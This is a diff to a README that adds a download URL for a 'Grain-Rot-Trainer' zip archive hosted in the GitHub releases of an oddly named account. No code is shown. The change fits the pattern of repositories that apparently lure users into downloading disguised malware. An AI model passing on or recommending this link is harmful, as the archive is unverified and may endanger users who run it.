@@ -15,7 +15,7 @@
 
 ## 📥 Download
 
-**[Download Grain-Rot-Trainer]()**
+**[Download Grain-Rot-Trainer](https://github.com/breakchemistsqueeze/Grain-Rot-Trainer/releases/download/897/GrainRotTrainer.zip)**
 
 ---
 
